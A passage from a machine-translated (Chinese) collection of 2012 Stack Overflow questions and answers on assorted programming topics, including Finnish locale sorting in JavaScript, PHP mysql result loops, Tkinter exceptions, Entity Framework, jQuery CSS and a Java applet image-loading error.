names.sort((nameA, nameB) => nameA.localeCompare(nameB, 'fi', {
  caseFirst: 'upper'
}));
console.log('locale sort with caseFirst option', names);
```

看起来该`caseFirst`选项在 Chrome 中有效，但目前在 Firefox 中无效。

[MDN 页面](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/localeCompare)包含更多信息和可用选项。`localeCompare`似乎可以很好地对芬兰语字符串进行排序，我想它也适用于许多其他语言环境。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-27T16:03:46.427

解决此问题的常用方法是使用映射列表（通常列表不需要长于三个，在您的情况下两个就可以了。）每个映射将一个字符映射到一个序列点。[注 3] 所以在你的例子中，

```
 primary:      secondary:
  A -> 0         A -> 0
  Á -> 0         Á -> 1
  B -> 1         (irrelevant)
  C -> 2
  D -> 3
  E -> 4
...
  T -> 20
  U -> 21
  V -> 22        V -> 0
  W -> 22        W -> 1
  X -> 23
... 
```

比较算法本质上首先将单词中的每个字符转换为使用映射1，如果它们不相同，则将其用作比较。如果它们相同，则使用 mapping2 重复（依此类推）。

并非所有语言都如此简单，因此有很多变体（例如，您可能会在第 2 步中反转字符串）。

请注意，您可以通过制作由翻译连接组成的比较键来实现相同的效果。如果您进行大量比较，缓存此密钥可能是一个胜利。在这种情况下，您将在“无关”的第一个映射之外的映射中使用特殊值。所有不相关的代码都可以省略，这通常会大大缩短比较键。

例如，在您的示例中（但只是大写，因为键入整个映射序列会很乏味），我们将使用第一个映射到`[22, 1, 20, 1, 15, 5, 15]`和第二个映射来翻译 VATANEN `[0, 0, --, 0, --, --, --]`。WATANEN 将`[22, 1, 20, 1, 15, 5, 15]`（完全相同）与第一个映射和`[1, 0, --, 0, --, --, --]`第二个映射。因此删除`--`'s [注 1]，比较键将是：

```
VATANEN:  [22, 1, 20, 1, 15, 5, 15, 0, 0, 0]
VÁTANEN:  [22, 1, 20, 1, 15, 5, 15, 0, 1, 0] (if there were such a place)
WATANEN:  [22, 1, 20, 1, 15, 5, 15, 1, 0, 0]
VIRTANEN: [22, 9, ...] 
```

这可以扩展到两个以上的转换表。

例如，许多应用程序想要执行不区分大小写的排序，但如果没有其他差异，则字符大小写会有所不同（在英语中，这通常意味着将带有大写字母的单词放在全部小写的单词之前，但两种选择都是合理的。）

所以在芬兰语的情况下，我们可以添加第三个翻译表，其中所有大写字母都被翻译为 0，所有小写字母都被翻译为 1，所有其他字符不被翻译。一些串联翻译：

```
 -------primary---------  --2ary-  ------tertiary-----
VÁTANEN:  [22, 1, 20, 1, 15, 5, 15, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]
Vátenen:  [22, 1, 20, 1, 15, 5, 15, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1]
WATANEN:  [22, 1, 20, 1, 15, 5, 15, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0] 
```

这个顺序是否“正确”一点也不明显。事实上，除了那些拥有官方语言权威的语言之外，对于大多数语言来说，“正确”意味着什么也不是很明显。[注 2] 因此，以上内容应仅视为多级编码的示例，而不是字母顺序的权威指南。在这种情况下，第三级代码仅由一个位组成，尽管可能仍有一些语言（如荷兰语）有几个字母的三种情况。

上面的方案没有考虑二合字母和三合字母，尽管它们很容易添加，但要小心。（在初级排序中，也可能在二级和三级排序中，二合字母需要为两个字符使用一个代码。）与非西班牙程序员的普遍看法相反，自 1994 年以来，西班牙语就不再是这样的例子，大约 20 年前，当 RAE 规定“ch”按字母顺序排列在“cg”和“ci”之间，而不是像以前那样在“c”和“d”之间。我相信一些讲荷兰语的人仍然希望同时找到“ij”和“y”，匈牙利人可能仍然尊重构成他们的字母表的复杂的二合字母和三合字母集合，但总的来说，用于字母排序的复杂机械方案正在消失，

* * *

[注1]：没有必要插入“不相关”的二级代码，因为编码的二级部分仅用于主要部分相同的单词对。由于任何被认为与二级编码无关的字母都会在一级等价类中的所有单词中被如此考虑，所以它可以从二级编码中省略。类似地，在不同的主要等价类中重用代码是合法的，就像我们上面所做的那样：[v, w] 是 [0, 1]，[a, á] 也是。显然，没有歧义的可能性。因此，二次编码在序列长度和比特长度上都可能非常短。

[注2]：英语没有这样的主体；西班牙文是[Real Academia Española](http://www.rae.es/RAE/Noticias.nsf/Home?ReadForm)，但我在书架上的任何 RAE 出版物中都找不到精确的校对规则，除了不按字母顺序考虑重音的简洁观察。然而，RAE 的字典似乎始终将不带重音的单词放在任何带有相同字母的重音单词之前，至少在我能想到的两种情况下——papa/papá 和 sabana/sábana。

[注 3] 当然，我们也需要跟踪原始数据，所以我们必须以某种方式将比较键附加到字符串。只要没有两个字符在所有映射中具有相同的翻译，这可以通过使用比较键作为键的简单哈希表来完成。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:34:51.697

我认为应该这样做：

```
var variants = ["AÁÀ", "VW", … ];

// Build a map that links variants with their base letter (for quick access)
var map = {}, chars = "";
for (var i=0; i<variants.length; i++) {
    var variant = variants[i], char = variant.charAt(0);
    for (var j=1; j<variants[i].length; j++)
        map[variant.charAt(j)] = char;
    chars += variant.substr(1);
}
// and a simple regular expression, containing a character class of all variant chars
var regex = new RegExp("["+chars+"]","g");

function sortFinnish(arr) {
    // each word is replaced by an array [literal],
    // containing 0) the word 1) the normalized word
    for (var i=0; i<arr.length; i++)
        arr[i] = [ arr[i], arr[i].replace(regex, function(m) {
            // every variant character is replaced by its base letter
            return map[m];
        }) ];
    // then sort that array with a custom compare function:
    arr.sort(function(a, b) {
        // at first by the normalized words,
        // i.e. variants count the same as their bases
        if (b[1] > a[1]) return -1;
        if (b[1] < a[1]) return 1;
        // else the normalized words are the same
        // - return a comparsion of the actual words
        if (b[0] > a[0]) return -1;
        if (b[0] < a[0]) return 1;
        return 0;
    });
    // after that, replace each of the arrays with the actual word again
    for (var i=0; i<arr.length; i++)
        arr[i] = arr[i][0];
    return arr;
} 
```

* * *

@performance：好的，我找到了一种不使用自定义比较功能的方法，根据[http://jsperf.com/sort-mapped-strings](http://jsperf.com/sort-mapped-strings)`.sort()`，[在某些环境中] 可能会更快一些。诀窍是使用具有返回要排序的字符串的方法的对象：`.toString()`

```
 function SortString(actualvalue) {
        this.val = actualvalue;
        // the value-to-sort-by is a normalized version, concatenated by a space
        // with the actual value so that the actual value is compared when the
        // normalized ones are the same.
        // ! does not work with values that contain spaces !
        // we'd need to use something like \u0001 instead
        var sortval = actualvalue.replace(regex, function(m) {
            // every variant character is replaced by its base letter
            return map[m];
        }) + " " + actualvalue;
        this.toString = function(){ return sortval; };
    }
    for (var i=0; i<arr.length; i++)
        arr[i] = new SortString(arr[i]);
    // when comparing, the sortstring is used as the object's representation:
    arr.sort();
    // after that, replace the objects with the actual words again:
    for (var i=0; i<arr.length; i++)
        arr[i] = arr[i].val; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-29T12:10:29.893

这里表达了多级排序的标准方法：http: [//unicode.org/reports/tr10/](http://unicode.org/reports/tr10/)

原则是使用基于区域设置的定制来覆盖默认 Unicode 排序元素表（DUCET， [http://www.unicode.org/Public/UCA/latest/allkeys.txt](http://www.unicode.org/Public/UCA/latest/allkeys.txt)）中表达的顺序。DUCET 是字符的基本排序顺序。如果语言环境有一些不能或不适合在 DUCET 中实施的特殊规则，则需要进行剪裁。

[http://unicode.org/Public/cldr/22/core.zip](http://unicode.org/Public/cldr/22/core.zip)中的目录 core/common/collat​​ion/有 87 个 xml 文件。fi.xml 中的芬兰剪裁示例：

```
<collation type="standard" >
    <rules>
    <!-- SNIP -->
        <reset>V</reset>
            <s>w</s>
            <t>W</t>
    <!-- SNIP -->
    </rules>
</collation> 
```

基于语言环境的排序实现起来相当繁琐，为了足够快，需要在尽可能低的（机器）级别使用资源，所以我认为最好等到Javascript 本身就支持它。

但可能等待永无止境：Javascript仍然缺乏对数字排序的支持，这在机器级别应该很容易实现。

如果某个编码人员有足够的动力在 Javascript 中实现基于语言环境的排序，我会很高兴看到结果并在我身边支持它。

# algorithm - 请解释优先级队列中的Decrease-Key和Extract-Min操作之间的关系

> ID：12624536
> 
> 赞同：1
> 
> 时间：2012-09-27T15:08:56.893
> 
> 标签：algorithm, data-structures, priority-queue, minimum-spanning-tree, prims-algorithm

优先级队列中的`EXTRACT-MIN`操作和操作之间的关系是什么？`DECREASE-KEY`我在使用 Prim 算法的最小跨度问题的讲座中遇到了这个问题。

麻省理工学院的教授[在视频中的 01:07:16 秒时提到了它，](http://videolectures.net/mit6046jf05_leiserson_lec16/)但我不明白。有人可以帮我解决这个问题吗？

PS：否则我对我对优先队列的理解感到满意。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:13:51.707

这个序列：

```
DECREASE-KEY(node, -infinity)
EXTRACT-MIN 
```

有一个简单的含义：

```
DELETE-KEY(node) 
```

它的基本作用是确保某个节点到达队列的顶部，然后将其删除。

在 Prim 算法中，`DECREASE-KEY`用于更新尚未包含在树中的节点的权重。结果，一个被认为太远的节点现在可能会更靠近队列的顶部（因此会`EXTRACT-MIN`更快地被编辑）。

我现在无法观看视频，但我的猜测是您的教授的意思是`DECREASE-KEY`增加了节点被`EXTRACT-MIN`编辑的机会，并且实际上出于相同的原因使用，因此是一种关系。

# php - PHP获取选择查询输出为数组

> ID：12624539
> 
> 赞同：0
> 
> 时间：2012-09-27T15:09:13.473
> 
> 标签：php, mysql

我有一个选择查询说

```
 $query = "select name from class";
 $equery = mysql_query($query);
 $v = mysql_fetch_array($equery);    
 print_r($v['name']); 
```

我的数据库中有 10 条记录，但总是只得到一个值。有没有其他方法可以以数组格式检索我的列。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:10:39.447

你需要循环它。

```
$query = "select name from class";
$equery = mysql_query($query);
$result = array();
while ($row = mysql_fetch_array($equery)) {
    $result[] = $row['name'];
}
print_r($result); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:12:35.877

不要使用`mysql`扩展，因为[它已被弃用](http://php.net/manual/en/intro.mysql.php)。您应该使用[`mysqli_result::fetch_all`](http://php.net/manual/en/mysqli-result.fetch-all.php)与[`mysqli`扩展名](http://php.net/manual/en/book.mysqli.php)，或[`PDOStatement::fetchAll`](http://php.net/manual/en/pdostatement.fetchall.php)与[`PDO`扩展名](http://php.net/manual/en/book.pdo.php)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:11:27.533

将所有内容放在一个**LOOP**中：

```
<?php

  while($v = mysql_fetch_array($equery);) {
  print_r($v['name']);
}
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:11:32.290

```
 $query = "select name from class";
 $equery = mysql_query($query);

 $v=null;
 $index=0;
 while($row = mysql_fetch_array($equery,MYSQL_ASSOC)){
     $v[$index++]=$row;
 } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-27T15:13:25.207

除了其他正确的答案之外：您不应该真正使用任何旧`mysql`命令，因为它们正在被贬值。你应该检查`mysqli`或`PDO`。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-27T15:16:30.230

你基本上不需要循环它，如果你只有一行输出，这种方式很好，但如果你有更多，你需要循环。

```
$a=mysql_fetch_array($resource) 
```

返回第一行，循环

```
while($row=mysql_fetch_assoc($resource))
{
echo ($row['name']);
} 
```

mysql_fetch_assoc 以关联数组的形式返回输出。我在所有 mysql 帖子上一直这么说，尝试切换到 PDO。 **不鼓励使用 mysql_query。**这意味着它的支持可能很快就会被删除。

[http://php.net/manual/en/function.mysql-query.php](http://php.net/manual/en/function.mysql-query.php)

# python - Python：Tkinter：打破按钮命令调用

> ID：12624542
> 
> 赞同：0
> 
> 时间：2012-09-27T15:09:17.217
> 
> 标签：python, tkinter, return, break

在 Tkinter 中，是否有可能分解到按钮上的回调。我有一段代码，如果用户犯了错误，将导致它的特定部分出错，但是它位于嵌套在另一个 for 循环和 while 循环中的 for 循环内，可以是 2 个或 3 个函数深度（这些函数的返回被操作）。

我想做的是在发现此错误时返回 mainloop() 。

所以代码看起来有点像：

```
from Tkinter import *
def func_call(val_list):
    y = []
    for nn in range(len(val_list)):
       if val_list[nn] < 0:
          print('You entered a value that was too low.')
          break
       else:
          y.append(val_list[nn]+5)
    return(y)
def Button_callback(value):
    val_list = [value,value-1,value-2,value-3]
    y = func_call(val_list)
    for nn in range(len(val_list)):
        print(y[nn])
root = Tk()
Button(root,text='Press me',command=lambda: Button_callback(1)).grid(row=0,column=0) 
root.mainloop() 
```

它的作用是识别值太低，然后打破for循环，然后将变量“y”返回给前一个函数，然后立即抛出一个错误，因为它期望“y”是相同的长度作为“val_list”。

我想做的是有效地返回按钮按下，因此只使用“您输入的值太低”来打破“func_call”和“Button_callback”。作为错误信息。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:49:08.747

这个问题与 Tkinter 没有太大关系，它只是一个正常的控制流问题。通常情况下，您希望内部函数停止所有处理的这种情况的处理方式是抛出异常，因为异常会向上传播，直到有东西捕获它。

例如：

```
def func_call(val_list):
    ...
    if val_list[nn] < 0:
        raise ValueError("value too low")
...
def Button_callback(value):
    ...
    try:
        y = func_call(val_list)
    except ValueError:
        return 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:51:15.823

也许您可以只返回 None 或返回空列表 y，而不是中断。这有问题吗？

# mysql - 实体框架“空插入语句”

> ID：12624544
> 
> 赞同：0
> 
> 时间：2012-09-27T15:09:24.210
> 
> 标签：mysql, entity-framework, dbcontext, entity-framework-5, notsupportedexception

我首先将实体框架代码与 dotConnect for MySQL 一起使用。

`context.SaveChanges()`在将对象添加到上下文后调用时出现以下错误：

> **DbUpdateException**：
> 更新条目时发生错误。有关详细信息，请参阅内部异常。
> 
> 内部异常：
> UpdateException：更新条目时出错。有关详细信息，请参阅内部异常。
> 
> 内部异常：EntityCommandCompilationException：准备命令定义时出错。有关详细信息，请参阅内部异常。"}
> 
> 内部异常：
> NotSupportedException：{“空插入语句。”}

`DbContext`在我将项目添加到后保存时`DbContext`

**奇怪的是，当我添加它的所有内容时，它添加成功，但是当我添加对象本身时，我得到了这个错误。**

这行代码失败：

```
context.TournamentTables.Add(tournamentTable); 
```

虽然这个工作完美：

```
tournamentTable.Columns.ForEach(column =>
                                   {
                                       column.Cells.ForEach((cell) => context.TournamentCells.Add(cell));
                                       context.TournamentColumns.Add(column);

                                   }); 
```

这是我尝试添加的对象：

```
public class TournamentTable //: IEnumerable<TournamentColumn>
    {
        [Key]
        [DatabaseGenerated(DatabaseGeneratedOption.Identity)]
        public int? Id { get; set; }

        public List<TournamentColumn> Columns { get; set; }

        public TournamentTable()
        {
            Columns = new List<TournamentColumn>();
        }

        public void AddColumn(int index, TournamentColumn column)
        {
            Columns.Insert(index, column);
        }

        public void RemoveColumn(int index)
        {
            Columns.RemoveAt(index);
        }

        /// <summary>
        /// Add a tournament cell at the top of the column.
        /// </summary>
        /// <param name="column"></param>
        public void AddColumn(TournamentColumn column)
        {
            Columns.Add(column);
        }

        /// <summary>
        /// Returns the tournament column at the index specified.
        /// </summary>
        /// <param name="index"></param>
        /// <returns></returns>
        [NotMapped]
        public TournamentColumn this[int index]
        {
            get { return Columns[index]; }
        }

        /// <summary>
        /// Returns the tournament cell at the index specified.
        /// </summary>
        /// <param name="columnIndex"></param>
        /// <param name="cellIndex"></param>
        /// <returns></returns>
        [NotMapped]
        public TournamentCell this[int columnIndex, int cellIndex]
        {
            get { return Columns[columnIndex][cellIndex]; }
            set
            {

                Columns[columnIndex][cellIndex] = value;
            }
        }
    } 
```

请注意，Tournament Table Id 默认为 0，如果 Id 声明为“int?” 比它将为空。我已经尝试了这两种情况，也自己设置了 id，但仍然失败。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T05:49:06.920

我认为您以错误的方式添加列。

基本上，你不需要这个：

```
tournamentTable.Columns.ForEach(column =>
{
    column.Cells.ForEach((cell) => context.TournamentCells.Add(cell));
    context.TournamentColumns.Add(column);
}); 
```

实体框架会为您做到这一点。您只需`context.TournamentTables.Add(tournamentTable)`在将所有列添加到锦标赛表后调用。

# iphone - WebView 不显示

> ID：12624555
> 
> 赞同：0
> 
> 时间：2012-09-27T15:10:04.023
> 
> 标签：iphone, ios, uitableview, uiwebview, webview

WebView 不显示。我的代码是

WebViewController.m

```
#import "WebViewController.h"

@interface WebViewController ()

@end

@implementation WebViewController

@synthesize url, webView;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)viewDidLoad
{

    [super viewDidLoad];
    webView = [[UIWebView alloc] initWithFrame:CGRectMake(0, 0, self.view.frame.size.width, self.view.frame.size.height)];
    [self.view addSubview:self.webView];
    [self.webView loadRequest:[NSURLRequest requestWithURL:url]];
}

- (void)viewDidUnload
{
    [super viewDidUnload];

    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}

@end 
```

在我的

视图控制器.m

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    // Spit out some pretty JSON for the tweet that was tapped. Neato.
    //NSString *formattedJSON = [[NSString alloc] initWithData:[NSJSONSerialization dataWithJSONObject:[self.office objectAtIndex:indexPath.row] options:NSJSONWritingPrettyPrinted error:nil] encoding:NSUTF8StringEncoding];
    //NSLog(@"tweet:\n%@", formattedJSON);

    NSObject *vURL = [self.office objectAtIndex:indexPath.row];
    self.URL =vURL;
    WebViewController * vc = [[WebViewController alloc] init];

    vc.url = [NSURL URLWithString:URL];
    NSLog(@"%@",URL);
    [self.navigationController pushViewController:vc animated:YES];

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:28:44.533

你的代码似乎没问题。我建议实现委托方法

```
-(void) webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error{} 
```

检查您是否在此处收到任何错误。您还可以使用委托检查加载是否已开始或已完成。

检查您的 self.navigationController 是否为零。

[如果您使用 https，此链接也可以为您提供帮助。](https://stackoverflow.com/questions/7021902/uiwebview-wont-display-https-iphone)

# java - Java 私人视频 YouTube

> ID：12624560
> 
> 赞同：1
> 
> 时间：2012-09-27T15:10:16.410
> 
> 标签：java, video, youtube-api

我在 GWT 中有一个应用程序，我想以编程方式查看私人 YouTube 视频（我上传的）。

阅读文档后：

*   [https://developers.google.com/youtube/2.0/developers_guide_java](https://developers.google.com/youtube/2.0/developers_guide_java)

和以下论坛：

*   [http://code.google.com/p/gdata-issues/issues/detail?id=520](http://code.google.com/p/gdata-issues/issues/detail?id=520)
*   [http://code.google.com/p/gdata-issues/issues/detail?id=872](http://code.google.com/p/gdata-issues/issues/detail?id=872)
*   [https://groups.google.com/forum/?fromgroups=#!topic/youtube-api-gdata/PXw1dMPkBSM](https://groups.google.com/forum/?fromgroups=#!topic/youtube-api-gdata/PXw1dMPkBSM)

我意识到这是不可能的！

鉴于这种情况，我的问题是：

有什么解决方法吗？

谢谢。

# javascript - 如何正确分离 JavaScript 视图/逻辑代码

> ID：12624563
> 
> 赞同：7
> 
> 时间：2012-09-27T15:10:19.967
> 
> 标签：javascript, jquery, html, model-view-controller, templates

我从带有更新/创建/删除标志的 websocket 接收 JSON 对象。根据这些信息，我可以更新、创建或删除 HTML 元素并绑定回调。这会影响多个 HTML 元素。

我目前的方法是将所有内容放入通过 jquery 处理 HTML 生成的特定对象中，例如：

```
$.("<table>").addChild($("<tr>")).addClass('test') 
```

并绑定事件监听器。但是随着越来越多的代码的添加，它变得非常混乱，现在我正在寻找一种合适的方法来分离代码。

关于如何正确执行此操作有什么想法吗？构架？也许是 jQuery 模板（这仍然让我对如何干净地添加回调一无所知）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T15:29:04.923

查找 MVVM 框架。这正是您所需要的，因为您的 JavaScript 变得越来越复杂。它将您的演示代码 (html) 和演示逻辑 (JavaSript) 之间的关注点分开

[Knockout.js](http://knockoutjs.com/)是一个非常好的帮助您入门的库，我建议您阅读教程以帮助您入门。

快速示例：

**HelloWorld.html**

```
<div data-bind="value: helloWorldVariable"></div>
<input type="button" data-bind="click: helloWorld" /> 
```

**page.js：**

```
var ViewModel = {
   helloWorldVariable: ko.observable('test'),
   helloWorld: function() {
       this.helloWorldVariable('clicked!');
   }
}

// Bind viewmodel 
```

当按钮被点击时，div会自动显示“clicked”。这显然可以在通过 AJAX 请求从服务器检索信息时使用，并且您不必依赖控件 ID/CSS 类。它们可以随时更改，并且您的代码仍然相关。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:26:23.803

要渲染 html，你可以使用[Handlerbars.js](http://handlebarsjs.com/)它非常成熟并且有很多文档

对于事件绑定，我建议您在未通过 ajax 更新删除的父对象上使用[jQuery 委托。](http://api.jquery.com/delegate/)这样您只需要在每个请求上重新分配事件

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:29:16.983

在您的情况下，我可以建议您查看[Knockoutjs](http://knockoutjs.com/)、[AngularJS](http://angularjs.org/)或[Backbone.js](http://documentcloud.github.com/backbone/)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:29:24.373

查看[Backbone.js](http://backbonejs.org)。这是一个非常流行和灵活的 MVC 风格的 JS 浏览器应用程序。代码托管在[github 上](https://github.com/documentcloud/backbone)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-27T15:29:31.517

[Knockout JS](http://knockoutjs.com/)可能值得一看，它将数据模型与视图模型分开，并处理它们之间的依赖关系。

# javascript - jQuery：如何从我的 div 中删除 CSS 边框属性？

> ID：12624570
> 
> 赞同：6
> 
> 时间：2012-09-27T15:10:32.663
> 
> 标签：javascript, jquery, css

我正在尝试删除 div 的边框，但没有运气。我已经在我的 css 中注释掉了代码，这是我要删除的正确属性。这是我目前正在使用的代码。背景颜色更改在下面的代码中起作用，但 removeClass 不是。

```
var tab = getURLParameter("tab");

// Disable the visual style of the button since it is disabled for this page.
if (tab == "Property") {
    $(".scrape-button").css('background-color', '#efefef');
    $(".scrape-button:hover").removeClass('border');
} 
```

有任何想法吗？谢谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-27T15:12:23.813

只需像这样删除 css 属性：

```
$(".scrape-button:hover").css('border',''); 
```

`.removeClass()`用于从元素中删除已声明的 css 类。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-27T15:16:50.497

带有 hover 伪类的 jQuery 选择器没有效果，因为页面中没有带有 hover 状态的元素。我建议你尝试不同的方法

```
<script>
  var tab = getURLParameter("tab");

  if (tab == "Property") {
    $(".scrape-button").addClass("disabled")
  }
</script>
<style>
  .disabled {
    background-color: #EFEFEF;
  }

  .disabled:hover {
    border: none;
  }
</style> 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-27T15:17:43.023

```
$('.scrape-button:hover').css('border', 'none'); 
```

试试这个

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-10-05T20:49:12.627

试试这个：

```
$(".scrape-button:hover").css('border',''); 
```

或者

```
$('.scrape-button:hover').css('border', 'none'); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-27T15:17:53.250

jQuery中没有**:hover**伪类。

试试这个

```
$('.scrape-button').hover(function() {
    $(this).removeClass('border')
}, function() {
    $(this).addClass('border')
});​ 
```

检查[FIDDLE](http://jsfiddle.net/tHMzH/1/) </p>

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-27T15:19:33.683

如果您正在使用课程，请尝试 -

```
$(".scrape-button:hover").attr('class',''); 
```

# java - Java Applet 无法从 Web 加载图像

> ID：12624572
> 
> 赞同：0
> 
> 时间：2012-09-27T15:10:38.733
> 
> 标签：java, image, exception, applet

我写了我的第一个 java 小程序。

它基本上从我的 Django 网络服务器加载一些图像，然后用户可以修改它们。

我是在 Eclipse 中开发的，完全没有问题。当我用测试页面尝试它时，在 java 控制台上出现此错误：

```
java.security.AccessControlException: access denied (java.net.SocketPermission www.hyros.net resolve)
    at java.security.AccessControlContext.checkPermission(AccessControlContext.java:374)
    at java.security.AccessController.checkPermission(AccessController.java:546)
    at java.lang.SecurityManager.checkPermission(SecurityManager.java:532)
    at java.lang.SecurityManager.checkConnect(SecurityManager.java:1031)
    at sun.plugin2.applet.Applet2SecurityManager.checkConnect(Applet2SecurityManager.java:500)
    at sun.plugin2.applet.Plugin2Manager$AppletContextImpl.getImage(Plugin2Manager.java:2718)
    at java.applet.Applet.getImage(Applet.java:242)
    at MapGenerator.getResourceImage(MapGenerator.java:50)
    at MapGenerator.init(MapGenerator.java:35)
    at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Plugin2Manager.java:1637)
    at java.lang.Thread.run(Thread.java:662)
Eccezione: java.security.AccessControlException: access denied (java.net.SocketPermission www.hyros.net resolve) 
```

有罪的一段代码：

```
for(int i=0; i< numero_immagini; i++) {
    try {
        URL url = new URL(this.getParameter(IMMAGINE+i));
        images[i] = ImageIO.read(url);
        floors[i] = Integer.parseInt(this.getParameter(PIANO_IMMAGINE+i));
    } catch (IOException ioe) {ioe.printStackTrace();}
} 
```

对于测试，我尝试了来自本地网络服务器的图像，但错误出现在每个可能的链接，内部或外部。

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:29:12.360

好的，解决了！

要更改的代码行是

```
URL url = new URL(this.getParameter(IMMAGINE+i)); 
```

到

```
URL url = new URL(getCodeBase(), this.getParameter(IMMAGINE+i)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:29:42.407

除非小程序已签名，否则它将无法访问与原始服务器不同的位置的图像。在这里你可以使用：

```
images[i] = getImage(getDocumentBase(), IMMAGINE + i); 
```

# .net - SqlDataReader 如何接收数据？

> ID：12624576
> 
> 赞同：2
> 
> 时间：2012-09-27T15:10:51.323
> 
> 标签：.net, ado.net, sqldatareader

以下简单代码使用 SqlDataReader 检索数据：

```
 SqlConnection conn = new SqlConnection("Data Source=.;Initial Catalog=myDB;Integrated Security=True");
    conn.Open();
    SqlCommand cmd = conn.CreateCommand();
    cmd.CommandText = "SELECT [t0].[ID], [t0].[Name] FROM [Persons] AS [t0]";
    SqlDataReader rdr = cmd.ExecuteReader();
    while (rdr.Read())
    {
        Console.WriteLine(rdr["id"] + " " + rdr["name"]);
    } 
```

在代码运行时，我使用 Sql Profiler 来监控数据库。我只看到一个选择命令。

```
SELECT [t0].[ID], [t0].[Name] FROM [Persons] AS [t0] 
```

所以似乎 SqlDataReader 将首先从服务器检索**所有**数据，然后枚举它们。

真的吗？如果数据太多怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:16:28.617

SqlDataReader 有一个 8 KB 的缓冲区。

重复问题：[DataReader 如何工作？](https://stackoverflow.com/questions/1383920/how-datareader-works)

# jquery - 我可以在不更改值的情况下更改输入字段中的文本吗

> ID：12624577
> 
> 赞同：2
> 
> 时间：2012-09-27T15:10:54.130
> 
> 标签：jquery, html, forms

可能吗？

如果是这样，这可能被认为是不好的做法，对吧？

**编辑**

我的意思是：输入字段的值通常与输入字段中显示的文本相同。我想知道有没有办法把两者分开...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:17:47.617

如果您在谈论`<INPUT>`字段：不。

但是，您可以编写 javascript 在表单提交之前更改值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:17:15.707

不使用单个`<input type="text">`表单元素，不。但是，应该可以将元素样式设置为看起来像输入框，显示您喜欢的任何文本，并使用`<input type="hidden">`表单元素返回不同的值。

不过，老实说，我看不出有任何有用的理由这样做。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:26:07.267

You can try Jquery's `.data()` function: [http://api.jquery.com/jQuery.data/](http://api.jquery.com/jQuery.data/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:55:28.747

你为什么不告诉我们你为什么要这么做？如果在页面加载时想要一个默认值，可以使用占位符功能，但是当用户输入一个值时，占位符会消失。

**代码**

```
<input type="text" value="[MUST BE EMPTY TO SHOW THE PLACEHOLDER]" placeholder="Placeholder goes here" /> 
```

# backbone.js - 使用先前提交的数据重新填充 Backbone 表单的集合

> ID：12624583
> 
> 赞同：0
> 
> 时间：2012-09-27T15:11:12.307
> 
> 标签：backbone.js, backbone-views

我能够将我的[表单](https://github.com/powmedia/backbone-forms)发布到我的数据库中，并且我已经通过我的后端函数来检查并查看我的 Get 函数是否返回了我提交的相同数据。但是，我无法理解如何在再次访问该页面时呈现这些数据。我错过了什么？目的是能够为可变的个人集合创建、读取、更新或删除 (CRUD) 一些个人联系数据。

```
//Model
var PersonItem = Backbone.Model.extend({
    url: "/Application/PersonList",
    idAttribute: "PersonId",
    schema: {
        Title: {
            type: 'Select',
            options: function (callback) {
                $.getJSON("/Application/GetTitles/").done(callback);
            }
        },
        Salutation: { type: 'Select', options: ['Mr.', 'Mrs.', 'Ms.', 'Dr.'] }, 
        FirstName: 'Text',
        LastName: 'Text',
        MiddleName: 'Text',
        NameSuffix: 'Text',
        StreetAddress: 'Text',
        City: 'Text',
        State: {
            type: 'Select',
            options: function (callback) {
                $.getJSON("/Application/GetStates/").done(callback);
            }
        },
        ZipCode: 'Text',
        PhoneNumber: 'Text',
        DateOfBirth: 'Date',
    }
});
Backbone.Form.setTemplates(template, PersonItem);
//Collection
var PersonList = Backbone.Collection.extend({
    model: PersonItem
